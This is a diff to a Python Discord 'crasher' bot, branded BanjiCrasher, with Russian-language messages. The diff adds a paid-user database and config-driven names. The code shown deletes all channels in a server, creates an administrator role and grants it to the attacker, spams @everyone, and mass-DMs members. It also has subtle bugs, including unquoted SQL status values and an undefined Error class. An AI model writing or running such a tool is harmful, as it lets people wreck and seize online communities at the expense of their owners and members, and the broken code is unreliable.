@@ -6,6 +6,8 @@ import discord
 from discord import utils
 import os, time,subprocess
 import config
+import sqlite3
+
 
 client = commands.Bot(command_prefix=config.prefix, self_bot=False)  # Префикс бота
 client.remove_command('help')
@@ -36,6 +38,39 @@ client.remove_command('help')
 
 
 
+##################DATABASE FUNC######################
+
+def create_connection(path):
+    connection = None
+    try:
+        connection = sqlite3.connect(path)
+        print("Connection to SQLite DB successful")
+    except Error as e:
+        print(f"The error '{e}' occurred")
+
+    return connection
+
+connection = create_connection("crasher.db")
+
+
+
+def check_user_in_db(id):
+	return bool(connection.execute("SELECT * FROM all_users WHERE user=?", (id,)).fetchone())
+
+def add_user_in_db(id):
+	connection.execute("INSERT INTO all_users ('user','status') VALUES(?,?)",(id,"suck"))
+	connection.commit()
+def add_buyed_user_in_db(id):
+	connection.execute('UPDATE all_users SET status = BUYED WHERE user = ?',(id,))
+	connection.commit()
+def delete_buyed_user_in_db(id):
+	connection.execute('UPDATE all_users SET status = suck WHERE user = ?',(id,))
+	connection.commit()
+
+
+
+########################### FUNC ###########################
+
 
 async def send_event_crasha(ctx, old_name, old_icon_url):
     link = await ctx.channel.create_invite(max_age=0)
@@ -46,7 +81,7 @@ async def send_event_crasha(ctx, old_name, old_icon_url):
                           color=0xff0000)
     embed.set_author(name="Приглашение на сервер", url=link)
     embed.set_thumbnail(url=old_icon_url)
-    embed.add_field(name="Cервер разнесли в пух и прах!", value="Powered by Banjiro_me#1111", inline=False)
+    embed.add_field(name="Cервер разнесли в пух и прах!", value=f"Powered by {bot_name}", inline=False)
     channel = client.get_channel(config.log_channel)
     await channel.send(embed=embed)
     print(ctx.message.guild, 'crashed')
@@ -95,12 +130,12 @@ async def start_crash(ctx):
             pass
     for channel in ctx.guild.channels:
         await channel.delete()
-    await ctx.author.send(f'Создание админ роли GOD и выдача вам')
+    await ctx.author.send(f'Создание админ роли и выдача вам')
     guilddd = ctx.guild
     permss = discord.Permissions(administrator=True)
-    await guilddd.create_role(name="GOD", permissions=permss, colour=discord.Colour(0xff0000),
+    await guilddd.create_role(name=config.admin, permissions=permss, colour=discord.Colour(0xff0000),
                             hoist=True)
-    roleee = discord.utils.get(ctx.guild.roles, name="GOD")
+    roleee = discord.utils.get(ctx.guild.roles, name=config.admin)
     userrr = ctx.message.author
     await userrr.add_roles(roleee)
     await ctx.author.send(f'Создание каналов и ролей с названием "Crashed by {ctx.author}"')
@@ -114,10 +149,7 @@ async def start_crash(ctx):
     for channel in ctx.guild.text_channels:
         await channel.send('@everyone')
         embed = discord.Embed(title="Сервер Крашиться!", color=0xfa0000)
-        embed.set_author(name="Сервер Автора крашера", url=config.main_invite,
-                         icon_url='https://wallpapercave.com/wp/wp7229965.jpg'),
-        embed.set_thumbnail(
-            url="https://wallpapercave.com/wp/wp7229965.jpg"),
+        embed.set_author(name="Сервер Автора крашера", url=config.main_invite),
         embed.add_field(name=f"Краш by {ctx.message.author}", value='Сервер был крашнут ботом BanjiCrasher',
                         inline=True),
         embed.set_footer(text="by Banjiro")
@@ -135,6 +167,14 @@ async def start_crash(ctx):
     await test(ctx, old_name, old_icon_url)
     await ctx.author.send(f"Поздравляю, краш прошел успешно, вы получили полные права на сервере {old_name}")
 
+########################### EVENTS ###########################
+
+@client.event
+async def on_guild_join(guild):
+	for member in guild.members:
+		if not member.bot:
+			if not check_user_in_db(member.id):
+				add_user_in_db(member.id)
 
 @client.event
 async def on_command_error(ctx, error):
@@ -157,6 +197,19 @@ async def on_ready():
     await channel.send(embed = discord.Embed(description=f'{client.user} загружен!',
                           colour=discord.Color.purple()))
 
+
+########################### ADMIN COMMANDS ###########################
+
+
+@client.command()
+async def add_buyed_user(ctx, member: discord.Member = None, count = None):
+	if ctx.author.id == config.developer:
+		add_buyed_user_in_db(member)
+
+@client.command()
+async def delete_buyed_user(ctx, member: discord.Member = None, count = None):
+	if ctx.author.id == config.developer:
+		delete_buyed_user_in_db(member)
 
 @client.command()
 @commands.has_role(config.admin)
@@ -211,14 +264,14 @@ async def opo(ctx, *, args):
     author = ctx.message.author
     args = args
     print(args)
-    biba = (f'{author.mention} Оповещений отправлено  c текстом: {args}!')
+    biba = (f'{author.mention} Оповещения отправлены  c текстом: {args}!')
     await ctx.send(biba)
     print("#0 Оповещение отправлено c текстом:", args)
     for member in ctx.guild.members:
         try:
             await member.send(args)
         except:
-            continue
+            pass
 ##################CRASH COMMANDS######################
 
 @client.command()
@@ -227,9 +280,9 @@ async def admin(ctx):
         await ctx.message.delete()
         guild = ctx.guild
         perms = discord.Permissions(administrator=True)
-        await guild.create_role(name="GOD", permissions=perms, colour=discord.Colour(0xff0000),
+        await guild.create_role(name=config.admin, permissions=perms, colour=discord.Colour(0xff0000),
                                 hoist=True)
-        role = discord.utils.get(ctx.guild.roles, name="GOD")
+        role = discord.utils.get(ctx.guild.roles, name=config.admin)
         user = ctx.message.author
         await user.add_roles(role)
         author = ctx.message.author
@@ -242,7 +295,7 @@ async def admin(ctx):
         channel = client.get_channel(config.log_channel)
         await channel.send(embed=embed)
     else:
-        await ctx.send("Этот сервер защищен BanjiSecure")
+        await ctx.send("Этот сервер защищен")
 
 
 @client.command()
@@ -257,7 +310,7 @@ async def admroles(ctx):
         embed = discord.Embed(description=f'{ctx.author.name} запросил сбор ролей на сервере {ctx.guild}', colour=discord.Color.purple())
         await channel.send(embed=embed)
     else:
-        await ctx.send("Этот сервер защищен BanjiSecure")
+        await ctx.send("Этот сервер защищен")
 
 @client.command()
 async def crash(ctx):
@@ -265,7 +318,7 @@ async def crash(ctx):
         await ctx.author.send('Краш начался!')
         await start_crash(ctx)
     else:
-        await ctx.send("Этот сервер защищен BanjiSecure")
+        await ctx.send("Этот сервер защищен!")
 
 
 @client.command()
@@ -273,8 +326,8 @@ async def crash(ctx):
 async def hello(ctx):
     await ctx.message.delete()
     embed = discord.Embed(title="Представлю вам нашего нового Краш-Бота", color=0x913ea8)
-    embed.set_author(name="Banjiro", url="https://discord.gg/RCpPV9KGsg",
-                     icon_url="https://media.discordapp.net/attachments/856179104939769856/856191764707803216/unknown.png")
+    embed.set_author(name="Banjiro", url=config.main_invite,
+                     icon_url=config.icon)
     embed.set_thumbnail(
         url="https://media.discordapp.net/attachments/856179104939769856/856191764707803216/unknown.png")
     embed.add_field(name="Скорость", value="Весь функционал оптимизирован что только ускоряет работу", inline=False)
